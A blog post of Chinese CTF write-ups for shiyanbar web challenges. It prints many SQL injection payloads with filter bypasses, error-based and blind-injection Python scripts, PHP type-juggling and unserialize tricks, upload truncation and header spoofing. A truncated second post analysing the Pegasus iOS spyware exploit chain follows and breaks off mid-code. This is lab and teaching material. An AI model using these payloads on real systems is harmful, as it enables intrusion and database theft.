$key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con)&#123; die(&#x27;Could not connect: &#x27; . mysql_error());&#125;$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = &#x27;&#123;$_POST[&#x27;uname&#x27;]&#125;&#x27;&quot;;$query = mysql_query($sql); //发起一条mysql查询if (mysql_num_rows($query) == 1) &#123; //mysql_num_rows() 返回结果集中行的数目。此命令仅对 SELECT 语句有效。要取得被 INSERT，UPDATE 或者 DELETE 查询所影响到的行的数目， $key = mysql_fetch_array($query); //返回根据从结果集取得的行生成的数组，如果没有更多行则返回 FALSE。 if($key[&#x27;pwd&#x27;] == $_POST[&#x27;pwd&#x27;]) &#123; print &quot;CTF&#123;XXXXXX&#125;&quot;; &#125;else&#123; print &quot;亦可赛艇！&quot;; &#125;&#125;else&#123; print &quot;一颗赛艇！&quot;;&#125;mysql_close($con);?&gt; 可以看到主要是 $filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)”; 这句话过滤了很多关键词 所以这个题目不能用以前的方法来做，要用到一个新的方法，参考文章 阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，但是我们不知道数据库中pwd是什么(注意此处是弱类型比较)。 这里是巧妙地用了select过程中用group by with rollup这个统计的方法进行插入查询。做几个实验看看。with rollup 1234567891011121314151617181920212223242526272829303132333435363738394041mysql&gt; create table test( -&gt; user varchar(100) not null, -&gt; pwd varchar(100) not null);Query OK, 0 rows affected (0.05 sec)mysql&gt; insert into test value(&quot;admin&quot;,&quot;mypwd&quot;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from test group by pwd with rollup -&gt; ;+-------+-------+| user | pwd |+-------+-------+| admin | mypwd || admin | NULL |+-------+-------+2 rows in set (0.00 sec)mysql&gt; select * from test group by pwd with rollup limit 1;+-------+-------+| user | pwd |+-------+-------+| admin | mypwd |+-------+-------+1 row in set (0.00 sec)mysql&gt; select * from test group by pwd with rollup limit 1 offset 0;+-------+-------+| user | pwd |+-------+-------+| admin | mypwd |+-------+-------+1 row in set (0.00 sec)mysql&gt; select * from test group by pwd with rollup limit 1 offset 1;+-------+------+| user | pwd |+-------+------+| admin | NULL |+-------+------+1 row in set (0.00 sec) 让pwd变成空，而且user这一列用的却是也是存在的字段！这就很好用了！又有if (mysql_num_rows($query) == 1)知道只要一列。 然后我们构造payload’ or 1=1 group by pwd with rollup limit 1 offset XX# 进行尝试 最终payload：uname=1&#39; or 1=1 group by pwd with rollup limit 1 offset 2#&amp;pwd= 简单的SQL注入3报错注入，方法有很多。 尝试发现floor，extractvalue，updatexml被吃掉了，那就用exp 爆库名：&#39;or EXP(~(SELECT * from(select database())a))# 爆表名：&#39;or EXP(~(SELECT * from(select group_concat(table_name) from information_schema.tables where table_schema=database())a))# 爆列名：&#39;or EXP(~(SELECT * from(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;)a))# 爆数据：&#39;or EXP(~(SELECT * from(select group_concat(flag) from flag)a))# 不得不说报错注入真的厉害。 在网上还看到用脚本bool注入的 1234567891011121314151617181920212223242526272829#!/usr/bin/env python3#coding:utf-8import sysimport reimport urllib.requestimport http.clientheaders = &#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125;flag = &#x27;&#x27;print(&quot;Start SQLi&quot;)for i in range(1,27): for payload in range(30,127): sys.stdout.write(&#x27;.&#x27;) sys.stdout.flush() conn = http.client.HTTPConnection(&#x27;ctf5.shiyanbar.com&#x27;,timeout=60) s = &quot;/web/index_3.php?id=1&#x27;+and+ascii(substr((select+flag+from+flag)%2C&#123;0&#125;%2C1))+%3D&#123;1&#125;%23&quot;.format(i,payload) conn.request(method=&#x27;GET&#x27;,url=s,headers=headers) response = conn.getresponse().read().decode(&#x27;utf-8&#x27;) conn.close() if response.find(str(&#x27;Hello&#x27;)) &gt;0: flag += chr(payload) print(i,chr(payload)) breakprint(&#x27;Done! flag is &#123;0&#125;&#x27;.format(flag)) 跑的时间有点长 简单的sql注入2既然是2，那么比1过滤的东西更多。 输入1，正常回显，输入 1’，报错，输入1’ or ‘1’=’1，报错 然后，尝试一堆东西，都是**SQLi detected!**，难道是把空格过滤了吗？ 输入1’or’1’=’1，返回所有数据，测试后，发现1’%0aor%0a’1’=’1和1’/**/or/**/‘1’=’1也可以正常返回。 爆库 1&#39;/**/union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/&#39;1&#39;=&#39;1 爆表 1&#39;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&#39;1&#39;=&#39;1 爆列 1&#39;/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag 爆内容 1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1 简单的sql注入1输入1，正常返回 输入1’，报错 输入1’ or ‘1’=’1，返回所有用户数据 应该是字符型注入， 测试了很多之后，发现order by,union select，都被过滤了 而且发现注释符也被过滤了(可以用 **’**号闭合 ，如having , where)， 要绕过关键字的过滤，有以下几个方法 大小写： Order SeLect 重复 ： unionunion selectselect 交叉： selecselectt 构造语句：1&#39; unionunion selectselect database()&#39;，发现空格也被过滤了 绕过空格有好多方法：+，/**/，%0a，或者两个空格代替一个空格， 如：`1’ unionunion selectselect database()’，爆出数据库(这里是两个空格) 爆表1&#39; unionunion selectselect table_name fromfrom information_schema.tables wherewhere &#39;1&#39;=&#39;1 爆列 1&#39; unionunion selectselect column_namcolumn_namee fromfrom information_schema.coluinformation_schema.columnsmns wherewhere table_name=&#39;flag 爆数据 1&#39; unionunion selectselect flag fromfrom flag wherewhere &#39;1&#39;=&#39;1 天下武功唯快不破 要求很快的传入一个值，键名是key,手传应该是不行的。 在header中找到一个 base解码之后P0ST_THIS_T0_CH4NGE_FL4G:dVcqymnw5 写一个脚本把dVcqymnw5，post上去居然不对，再看header时，发现值变了，看来是每刷新一次，FLAG都会变，所以，把这一部分也写进脚本里 123456789import requests,base64url=&#x27;http://ctf5.shiyanbar.com/web/10/10.php&#x27;ses=requests.Session()r = ses.get(url)key=base64.b64decode(r.headers[&#x27;FLAG&#x27;])[-9:]print(key)r=ses.post(url,data=&#123;&#x27;key&#x27;:key&#125;)print(r.text) 让我进去看了源码，什么信息都没有，bp抓包之后，在cookie中发现了一个source=0，尝试改成source=1，得到了源码 12345678910111213141516171819202122232425262728293031$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) &#123; if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123; if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123; echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); &#125; else &#123; die (&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;); &#125; &#125; else &#123; die (&quot;You are not an admin! LEAVE.&quot;); &#125;&#125;setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) &#123; setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE[&quot;source&quot;] != 0) &#123; echo &quot;&quot;; // This source code is outputted here &#125;&#125; 1.Cookie中getmein的值不能为空2.username必须为admin和password不能为admin3.Cookie中的getmein必须等于md5($secret.urldecode($username.$password)) 满足这三个条件才可获得flag，可是我们无法得知$secret的值为多少, 拐弯抹角直接给出了源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677 &lt;?php// code by SEC@USTCecho &#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&#x27;;$URL = $_SERVER[&#x27;REQUEST_URI&#x27;];//echo &#x27;URL: &#x27;.$URL.&#x27;&lt;br/&gt;&#x27;;$flag = &quot;CTF&#123;???&#125;&quot;;$code = str_replace($flag, &#x27;CTF&#123;???&#125;&#x27;, file_get_contents(&#x27;./index.php&#x27;));$stop = 0;//这道题目本身也有教学的目的//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的//所以，第一个要求就是不得出现 ./if($flag &amp;&amp; strpos($URL, &#x27;./&#x27;) !== FALSE)&#123; $flag = &quot;&quot;; $stop = 1; //Pass&#125;//第二，我们可以构造 \\ 来代替被过滤的 ///所以，第二个要求就是不得出现 ../if($flag &amp;&amp; strpos($URL, &#x27;\\\\&#x27;) !== FALSE)&#123; $flag = &quot;&quot;; $stop = 2; //Pass&#125;//第三，有的系统大小写通用，例如 indirectioN///你也可以用?和#等等的字符绕过，这需要统一解决//所以，第三个要求对可以用的字符做了限制，a-z / 和 .$matches = array();preg_match(&#x27;/^([0-9a-z\\/.]+)$/&#x27;, $URL, $matches);if($flag &amp;&amp; empty($matches) || $matches[1] != $URL)&#123; $flag = &quot;&quot;; $stop = 3; //Pass&#125;//第四，多个 / 也是可以的//所以，第四个要求是不得出现 //if($flag &amp;&amp; strpos($URL, &#x27;//&#x27;) !== FALSE)&#123; $flag = &quot;&quot;; $stop = 4; //Pass&#125;//第五，显然加上index.php或者减去index.php都是可以的//所以我们下一个要求就是必须包含/index.php，并且以此结尾if($flag &amp;&amp; substr($URL, -10) !== &#x27;/index.php&#x27;)&#123; $flag = &quot;&quot;; $stop = 5; //Not Pass&#125;//第六，我们知道在index.php后面加.也是可以的//所以我们禁止p后面出现.这个符号if($flag &amp;&amp; strpos($URL, &#x27;p.&#x27;) !== FALSE)&#123; $flag = &quot;&quot;; $stop = 6; //Not Pass&#125;//第七，现在是最关键的时刻//你的$URL必须与/indirection/index.php有所不同if($flag &amp;&amp; $URL == &#x27;/indirection/index.php&#x27;)&#123; $flag = &quot;&quot;; $stop = 7; //Not Pass&#125;if(!$stop) $stop = 8;echo &#x27;Flag: &#x27;.$flag;echo &#x27;&lt;hr /&gt;&#x27;;for($i = 1; $i &lt; $stop; $i++) $code = str_replace(&#x27;//Pass &#x27;.$i, &#x27;//Pass&#x27;, $code);for(; $i &lt; 8; $i++) $code = str_replace(&#x27;//Pass &#x27;.$i, &#x27;//Not Pass&#x27;, $code);echo highlight_string($code, TRUE);echo &#x27;&lt;/body&gt;&lt;/html&gt;&#x27;; 一大段的代码，上来就是各种过滤，一脸懵逼，只好去百度了，然后了解到了一个新知识url伪静态，详细信息可以去百度，最关键的就一句话，url中含有xxxx.php/aaa/bbb，那么.php后的aaa就会被当成键名或者说参数名，bbb会被当成键值或者参数值 payload：index.php/aa/index.php，即可得到flag Forms查看源码，&lt;input type=&quot;hidden&quot; name=&quot;showsource&quot; value=0&gt;表明有一个隐藏的输入框，具体可以百度。 bp抓包，把showsource=0，改成showsource=1，得到源码 123456$a = $_POST[&quot;PIN&quot;];if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123; echo &quot;Congratulations! The flag is $flag&quot;;&#125; else &#123; echo &quot;User with provided PIN not found.&quot;; &#125; 看到要求输入的pin=-19827747736161128312837161661727773716166727272616149001823847，提交一下试试，得到flag。 天网管理系统点击他给的用户名和密码登录，没有反应，查看源码，有一行注释 1$test=$_GET[&#x27;username&#x27;]; $test=md5($test); if($test==&#x27;0&#x27;) 这里提示我们传入一个username，然后经过MD5处理后，值等于0， 在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: ‘3’ == ‘3ascasd’结果为true。 那么就要找一个经过MD5处理后，值为0，或者说第一个字母是0的字符串，这里有几个240610708，aabg7XSs，aabC9RqS ， bp抓包后，把username的值换成240610708，得到一个页面的地址，/user.php?fame=hjkleffifer 访问/user.php?fame=hjkleffifer，得到一部分源码 123456$unserialize_str = $_POST[&#x27;password&#x27;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&#x27;user&#x27;] == &#x27;???&#x27; &amp;&amp; $data_unserialize[&#x27;pass&#x27;]==&#x27;???&#x27;)&#123; print_r($flag); &#125; 这是PHP反序列化的知识，要求当反序列化后的数组中的user=’???’并且pass=’???’，输出flag 但是我们不知道两处???到底是什么，因此无法考虑用php函数构造这样的值。 最牛的地方来了，bool类型的true跟任意字符串可以弱类型相等。 因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。 所以，我们要构造一个数组，是user=true，pass=true，然后进行序列化，序列化过程如下： 123456&lt;?php$arr=array(&#x27;user&#x27;=&gt;true,&#x27;pass&#x27;=&gt;true);$arr2=serialize($arr);echo $arr2;?&gt; 把a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}放到password，即可得到flag 忘记密码了查看源码 有重要信息，看到了用户名和用户邮箱，以及文件编辑器是vim，那么有可能存在文件泄露，试了一下，没有。。。 用管理员邮箱登录试试，提示说发到管理员邮箱，你看不到 随便输一个邮箱登录，显示一下信息，显示有一个step2.php， 直接访问，发现网页闪了一下，又回到step1.php了，查看step2.php的源码，有个submit.php 打开看看，提示说you are not admin，怎么才能成为管理员呢？ 想起来vim了，再在这个页面看看有没有文件泄露，访问.submit.php.swp，有源码。 12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die(&#x27;fail&#x27;); if($token!=&#x27;0&#x27;) die(&#x27;fail&#x27;); $sql = &quot;SELECT count(*) as num from `user` where token=&#x27;$token&#x27; AND email=&#x27;$emailAddress&#x27;&quot;; $r = mysql_query($sql) or die(&#x27;db error&#x27;); $r = mysql_fetch_assoc($r); $r = $r[&#x27;num&#x27;]; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo &quot;失败了呀&quot;; &#125;&#125; if(strlen($token)!=10) die(‘fail’); if($token!=’0’) die(‘fail’); //要求token的长度要=10，值=0 要想满足这个要求，可以使token=0e10000000或者token=0000000000，都可以。 至于emailAddress，应该就是开始的那个管理员邮箱，&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#x73;&#x69;&#x6d;&#112;&#x6c;&#101;&#x78;&#x75;&#x65;&#46;&#x63;&#x6f;&#109; 所以payload1：?emailAddress=admin@simplexue.com&amp;token=0000000000 payload2：?emailAddress=admin@simplexue.com&amp;token=0e99999999 Once More1234567891011121314151617181920212223&lt;?phpif (isset ($_GET[&#x27;password&#x27;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123; echo &#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;; &#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123; if (strpos ($_GET[&#x27;password&#x27;], &#x27;*-*&#x27;) !== FALSE) &#123; die(&#x27;Flag: &#x27; . $flag); &#125; else &#123; echo(&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;); &#125; &#125; else &#123; echo &#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;; &#125;&#125;?&gt; if (ereg (“^[a-zA-Z0-9]+$”, $_GET[‘password’]) === FALSE) //password由数字和字母组成 if (strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’] &gt; 9999999) //password长度小于8，password&gt;9999999 if (strpos ($_GET[‘password’], ‘*-*‘) !== FALSE) //password必须包含*-* ereg()函数可以哄%00截断，来绕过判断，strpos()则可以使用数组来绕过。 payload：?password[]=1 还可以不绕过strpos()，那就要使用科学计数法，来绕过if (strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’] &gt; 9999999)，并且把*-*拼接上去，payload：?password=1e8%00*-* Guess Next Session源码 12345678910&lt;?phpsession_start(); if (isset ($_GET[&#x27;password&#x27;])) &#123; if ($_GET[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;]) die (&#x27;Flag: &#x27;.$flag); else print &#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; bp抓包之后一顿操作，然而没有成功，尝试在cookie里面添加一个值，也不对，百度一下，看看别人的wp，参考文章 观察代码，在代码中并没有什么函数，关键就在于：password = $_session[‘password’]。 问题到了这一步，让我们把这放下，先来分析一下PHP中的Session和Cookie。 Cookie与 Session，一般都会认为这是两个独立完全不同的东西，Session采用的是在服务器端保持状态的方案，而Cookie采用的是在客户端保持状态的方案。在PHP配置中的默认情况下，Session是用Session ID来确定当前对话所对应的服务器Session，而Session ID是通过Cookie来传递的，禁用Cookie相当于失去了Session ID，也就得不到Session了。 bp抓包之后， 从抓包的内容中我们就能看见在Cookie中已经是包含了Sessid，并且发送的password在URL中以Get的方式传值。 那这里我们就可以以这样的思路来求解。首先我们删除所有的Cookie，将PHPSessid值直接删掉，这样的结果就会使得$_session[‘password’]值为空，接下来我们将URL中的password值清空，这样我们就能达到password = $_session[‘password’]的效果。 右键，发送到Repeater，删掉Cookie和password，点击go就能得到flag FALSE查看源码 12345678910111213&lt;?phpif (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123; if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;]) echo &#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;; else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;])) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;;&#125;else&#123; echo &#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;;?&gt; if ($_GET[‘name’] == $_GET[‘password’]) if (sha1($_GET[‘name’]) === sha1($_GET[‘password’])) 要求name!=password，但是sha1(name)===sha1(password) 这是md5的强比较，可以使用数组绕过 payload：?name[]=1&amp;password[]=2 上传绕过这个题忘了在哪做过了 尝试改后缀名不行之后，那么就猜测是0x00截断，0x00截断的原理是当文件系统读取到0x00是会认为文件已经结束了，不处理后面的内容。 bp抓包， 打开hex，找到2b(+)，改成00， 然后go，即可得到flag NSCTF web200 先说一下strrev函数，是一个字符串反转函数，例如： 12345&lt;?phpecho strrev(&quot;Hello world!&quot;); // 输出 &quot;!dlrow olleH&quot;?&gt; substr — 返回字符串的子串，例如： 12345678&lt;?php$rest = substr(&quot;abcdef&quot;, 0, -1); // 返回 &quot;abcde&quot;$rest = substr(&quot;abcdef&quot;, 2, 5); // 返回 &quot;cdef&quot;$rest = substr(&quot;abcdef&quot;, 4, -4); // 返回 &quot;&quot;$rest = substr(&quot;abcdef&quot;, -3, -1); // 返回 &quot;de&quot;?&gt; decode算法 123456789101112&lt;?php$_=&quot;&quot;;$str=&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;$a=base64_decode(strrev(str_rot13($str)));for($_0=strlen($a)-1;$_0&gt;=0;$_0--)&#123; $_c=substr($a,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c;&#125;echo $_; 程序逻辑问题查看源码，发现一个index.php，打开之后是php源码 123456789101112131415161718192021222324252627&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;); mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error) &#123; die(&quot;Connection failed: &quot; . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = &quot;select pw from php where user=&#x27;$user&#x27;&quot;;$query = mysql_query($sql);if (!$query) &#123; printf(&quot;Error: %s\\n&quot;, mysql_error($conn)); exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;&#125;else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125; &#125;?&gt; strcasecmp() 函数比较两个字符串。 提示：strcasecmp() 函数是二进制安全的，且不区分大小写。 提示：该函数与 strncasecmp() 函数类似，不同的是，通过 strncasecmp() 您可以指定每个字符串用于比较的字符数。 $sql = “select pw from php where user=’$user’”; 说明是单引号闭合， $pass = md5($_POST[pass]); if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) 可以看出post提交的password经过了MD5处理，而要想得到flag，必须使得数据库中查询到的password和经过MD5处理的提交了的password相等，提交的password我们 可以控制，但是数据库中的password我们就不知道是多少了。 但是，我们发现$row[pw]的值是从$sql中提取出来的，所以我们只要改变了$sql里的pw值就可以了，我们可以用SQL语句随便查询一个pw值，然后使得提交的password的MD5值和这里查询的password的MD5值相等即可。 payload：username=-1&#39; union select md5(1)#&amp;password=1 what’ the fuck?打开是一大段JSFUCK码，直接放在控制台跑一下，得到flag，也可以在线解码。 PHP大法有提示查看index.php.txt，有源码 12345678910111213&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123; echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125;?&gt; 一看，发现这道题在bugku做过，二次编码绕过 payload：?id=hackerD%254A，就行了。 这个看来有点简单这题一看就是注入，测试了一下，就是一个bool注入,两列 然后就是四步走 爆库 ?id=-1 union select 1,database()# 爆表 ?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 爆列 ?id=-1 union select 1,column_name from information_schema.columns where table_name=&#39;thiskey&#39;# 爆内容 ?id=-1 union select 1,k0y from thiskey# 就可以得到flag了 貌似有点难打开就说代码审计，那就看看源码： 123456789101112131415161718192021&lt;?phpfunction GetIP()&#123;if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;])) $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;])) $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;])) $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];else $cip = &quot;0.0.0.0&quot;;return $cip;&#125;$GetIPs = GetIP();if ($GetIPs==&quot;1.1.1.1&quot;)&#123;echo &quot;Great! Key is *********&quot;;&#125;else&#123;echo &quot;错误！你的IP不在访问列表之内！&quot;;&#125;?&gt; 这段代码要求本地的IP是1.1.1.1就会输出flag，即要求： X-Forwarded-For:1.1.1.1 bp抓包，添加这个就可以了。 头有点大看这个题目的提示，问题应该在header上。 您无权访问此服务器上的/。请确保您已安装.net framework 9.9！确保您在英格兰地区并使用Internet Explorer浏览此站点 有三个要求：1.使用.net 9.9框架 2.在英国 3.使用IE浏览器。 要修改http的请求头，来伪装一下。 bp抓包之后，修改User-Agent和Accept-Language即可 User-Agent: compatible; MSIE 6.0;.NET CLR 9.9 //伪装成IE和.net 9.9 Accept-Language:en-gb //伪装是英国 看起来有点难看着像注入题，随便输入一个账户和密码，显示数据库连接失败 把用户名换成admin试试，变成了登录失败，错误的用户名和密码。 这是为什么呢？然后又换了其他用户名试了试，发现都是数据库连接失败，于是猜测，admin就是正确的用户名， bp抓包，然后希望通过构造永真的条件来跳过密码验证，都失败了，导出文件之后，sqlmap跑了几遍也不行，，，，，，， 只好在网上找找wp了，发现是sleep延时注入(延时注入不怎么会啊)， 看着做一遍吧，参考文章 测试payload: ?admin=admin&#39; and sleep(5) and &#39;&#39;=&#39;&amp;pass=&amp;action=login 发现延时5秒，存在注入 拿人家的脚本试试 1234567891011121314151617181920212223242526272829303132import requestsimport time payloads = &#x27;abcdefghijklmnopqrstuvwxyz0123456789@_.&#123;&#125;-&#x27; #不区分大小写的 flag = &quot;&quot;key=0print(&quot;Start&quot;)for i in range(1,50): if key == 1: break for payload in payloads: starttime = time.time()#记录当前时间 headers = &#123;&quot;Host&quot;: &quot;ctf5.shiyanbar.com&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Cookie&quot;: &quot;Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1470994390,1470994954,1470995086,1471487815; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*67928%2CnickName%3Ayour&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &#125; url = &quot;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin&#x27; and case when(substr(password,%s,1)=&#x27;%s&#x27;) then sleep(10) else sleep(0) end and &#x27;&#x27;=&#x27;&amp;pass=&amp;action=login&quot; %(i,payload)#数据库 res = requests.get(url, headers=headers) if time.time() - starttime &gt; 10: flag += payload print(&#x27;\\n pwd is:&#x27;, flag) break else: if payload == &#x27;-&#x27;: key = 1 breakprint(&#x27;\\n[Finally] current pwd is %s&#x27; % flag) 成功得到密码 想看详细信息的，查看原文 用密码登录之后，即可得到flag","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"实验吧web","slug":"实验吧web","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C%E5%90%A7web/"}]},{"title":"iOS远程越狱间谍软件Pegasus技术分析","slug":"编程/iOS远程越狱间谍软件Pegasus技术分析","date":"2019-04-10T06:45:30.000Z","updated":"2021-05-23T07:32:08.957Z","comments":true,"path":"2019/04/10/编程/iOS远程越狱间谍软件Pegasus技术分析/","link":"","permalink":"http://example.com/2019/04/10/%E7%BC%96%E7%A8%8B/iOS%E8%BF%9C%E7%A8%8B%E8%B6%8A%E7%8B%B1%E9%97%B4%E8%B0%8D%E8%BD%AF%E4%BB%B6Pegasus%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","excerpt":"前言听了报告，了解一下","text":"前言听了报告，了解一下 正文一、事件苹果公司昨天针对IOS发布了一个安全更新，涉及到三个0 day漏洞，这次漏洞的发现过程从一次APT攻击开始。大家需要注意，黑客通过漏洞进行远程控制并获得IOS用户的系统最高权限，造成敏感信息泄露、数据破坏等严重后果。 这次漏洞的发现过程从一次APT攻击开始。阿联酋人权活动人士Ahmed Mansoor在他的苹果手机上收到一个含有链接地址的短信，短信声称链接的内容是关于阿联酋虐待监狱囚犯的。Mansoor引起警觉，随即将该链接提供给了加拿大的Citizen实验室。Citizen实验室和Lookout公司的联合研究结果表明，这是一种针对IOS用户的APT攻击，该攻击代码被命名为Pegasus。 二、Pegasus简介Pegasus攻击的方式很简单，有效载荷的传播也是静默方式。攻击者给受害者发送一个URL，可以是短信、邮箱、社交软件或者任何其他方式，受害者仅需点击一下链接，服务器就开始向受害者的手机传输攻击载荷，远程越狱受害者的手机，然后安装监控软件。一切都是在受害者不知情的状况下发生的，受害者唯一可以察觉的就是按下这个链接之后，浏览器自动退出了。监控软件包含木马代码和程序，用来监控、收集数据并且上传到服务器，受害者的一举一动尽在攻击者的掌握之中。为了达到完全静默监控，监控软件不会下载这些软件的木马版本，重新安装到受害者手机上。而是采用预装的版本，包括系统软件和用户安装的软件。 一般情况下，iOS的系统是为软件做好分离设计的，软件之间是无法通信甚至无法知道对方存在的。但是越狱后的系统确是可以通过hooking的方式来监控其他软件的。三叉戟软件套装通过加载其动态链接库到目标进程的方式，可以应用于hook那些安装有Cydia Mobile Substrate框架的软件。这个框架在越狱社区非常有名，Pegasus套装也使用了这个框架。 三、攻击条件Pegasus一共涉及到三个IOS 0day漏洞的利用：CVE-2016-4655、CVE-2016-4656和CVE-2016-4657。 CVE-2016-4655： KASLR漏洞，可以寻找到内核基址。在Pegasus进行越狱之前，它首先得确定内存中内核的位置。苹果系统中的KASLR保护就是把内核映射到不可预测的内存地址，以起到保护的作用。 但是在这个漏洞中，攻击者使用一个函数调用，这个函数会在返回值中返回没有经过混淆的内存地址，从而攻击者可以计算出内核的基址，锁定内核的位置。 漏洞原理 OSUnserializeBinary函数用于解析二进制格式的序列化对象，之前爆出的UAF漏洞(CVE-2016-1828)和这次的UAF漏洞(CVE-2016-4656)都存在于该函数中。观察OSNumber对象的创建代码。 123456789101112131415161718len = (key &amp; kOSSerializeDataMask);wordLen = (len + 3) &gt;&gt; 2;end = (0 != (kOSSerializeEndCollecton &amp; key));DEBG(&quot;key 0x%08x: 0x%04x, %d\\n&quot;, key, len, end);newCollect = isRef = false;o = 0; newDict = 0; newArray = 0; newSet = 0;switch (kOSSerializeTypeMask &amp; key)&#123; ... case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = 